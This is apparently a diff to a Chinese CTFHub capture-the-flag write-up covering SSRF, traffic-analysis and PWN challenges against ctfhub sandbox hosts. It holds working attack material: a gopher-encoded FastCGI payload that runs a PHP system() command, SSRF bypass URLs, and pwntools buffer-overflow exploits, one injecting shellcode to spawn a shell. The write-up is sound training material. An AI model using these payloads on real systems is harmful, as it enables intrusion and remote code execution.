@@ -1,4 +1,6 @@
 
+## Web
+
 ### 信息泄露 - 请求方式
 
 根据提示，使用 `CTFHUB` 方式请求
@@ -1174,7 +1176,7 @@ Content-Disposition: form-data; name="file"; filename="file"
 Content-Type: text/plain
 
 123
---BOUNDARY--
+	--BOUNDARY--
 """
 
 def main() -> None:
@@ -1191,6 +1193,171 @@ flag: `ctfhub{a6723782f8ad2c52604d0def}`
 
 ### SSRF - FastCGI 协议
 
+工具一把梭吧
 
-### SSRF - 数字 IP bypass
+```shell
+$ docker run --rm -it python:2 bash
+$ git clone https://github.com/tarunkant/Gopherus
+```
 
+```
+http://challenge-7909afd9998d12ff.sandbox.ctfhub.com:10800/?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_7bafd1eb063b27aee55a0bb1081481cb%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
+```
+
+flag: `ctfhub{1fa6401725bb1aa6546237f1}`
+
+### SSRF - Redis 协议
+
+同上
+
+flag: `ctfhub{70927d6cd719018a14cf0a6e}`
+
+### SSRF - URL Bypass
+
+```
+http://challenge-f3d9397c4d8e9416.sandbox.ctfhub.com:10800/?url=http://notfound.ctfhub.com@localhost/flag.php
+```
+
+flag: `ctfhub{efbb10f91e3f891fa332b991}`
+
+### SSRF - 数字 IP Bypass
+
+```
+http://challenge-a0657786d438dfe0.sandbox.ctfhub.com:10800/?url=http://localhost/flag.php
+```
+
+flag: `ctfhub{c15492312a1d211447b36959}`
+
+### SSRF - 302 跳转
+
+?
+
+```
+http://challenge-8346029fd5a95a49.sandbox.ctfhub.com:10800/?url=http://localhost/flag.php
+```
+
+flag: `ctfhub{4f4bb8649fdb70632bdb398c}`
+
+### SSRF - DNS 重绑定 Bypass
+
+? 题有问题吧
+
+```
+http://challenge-b1853cf7c806321f.sandbox.ctfhub.com:10800/?url=http://localhost/flag.php
+```
+
+flag: `ctfhub{ae552a3b030dbacf798bd889}`
+
+
+## Misc
+
+### 流量分析 - MySQL 流量
+
+flag: `ctfhub{mysql_is_S0_E4sy}`
+
+### 流量分析 - Redis 流量
+
+flag: `ctfhub{6051d6123de43dfad7609804925c0121}`
+
+### 流量分析 - Mongo 流量
+
+flag: `ctfhub{5f284ecc279d2cbd1af258bb53c7a5f6}`
+
+### 流量分析 - ICMP - Data
+
+有点刻意了。。。
+
+```shell
+$ tshark -r icmp_data.pcap -Y 'icmp.type == 8 and data' -T fields -e data.data | cut -c 17-18 | tr -d '\n' | xxd -r -p
+
+ctfhub{c87eb99796406ac0b}
+```
+
+flag: `ctfhub{c87eb99796406ac0b}`
+
+### 流量分析 - ICMP - Length
+
+```shell
+$ tshark -r icmp_len.pcap -Y 'icmp.type == 8 and data' -T fields -e data | awk '{ print length / 2 }' | xargs printf '%x\n' | tr -d '\n' | xxd -r -p
+ctfhub{acb659f023}
+```
+
+flag: `ctfhub{acb659f023}`
+
+### 流量分析 - ICMP - LengthBinary
+
+```python
+import subprocess
+
+cmd = [
+        'tshark',
+        '-r', 'icmp_len_binary.pcap',
+        '-Y', 'icmp.type == 8 and data',
+        '-T', 'fields',
+        '-e', 'data',
+]
+
+results = subprocess.run(cmd, stdout=subprocess.PIPE)
+
+data = results.stdout.decode().strip().split('\n')
+
+bits = [1 if len(_) == 128 else 0 for _ in data]
+
+bytes_list = [bits[i:i+8] for i in range(0, len(bits), 8)]
+
+chars = [chr(int(''.join(map(str, _)), 2)) for _ in bytes_list]
+
+print(''.join(chars))
+```
+
+flag: `ctfhub{04efed1e05}`
+
+## PWN
+
+### ret2text
+
+```python
+import pwn
+
+host: str = 'challenge-2de33cb94f8c3d3c.sandbox.ctfhub.com'
+port: int = 27092
+
+proc = pwn.connect(host, port)
+
+payload: bytes = ('A' * (0x70 + 8)).encode('utf-8') + pwn.p64(0x4007b8)
+
+proc.send(payload)
+proc.interactive()
+```
+
+flag: `ctfhub{b6981d7b987871fd84965909}`
+
+### ret2shellcode
+
+```python
+import pwn
+import re
+
+host: str = 'challenge-05423801aa363cbc.sandbox.ctfhub.com'
+port: int = 39167
+
+pwn.context.arch = 'amd64'
+
+proc = pwn.connect(host, port)
+
+prompt = proc.recvuntil(']')
+match = re.search(r'\[(0x[a-f0-9]+)\]', prompt.decode('utf-8'))
+buf_addr = int(match.group(1), base=16)
+
+
+shellcode = pwn.asm(pwn.shellcraft.sh())
+
+shellcode_addr = buf_addr + 0x10 + 8 + 8    # stack, ebp, ret addr
+
+payload = b'A' * (0x10 + 8) + pwn.p64(shellcode_addr) + shellcode
+
+proc.sendline(payload)
+proc.interactive()
+```
+
+flag: `ctfhub{440de05240d8aa4bb58fc295}`
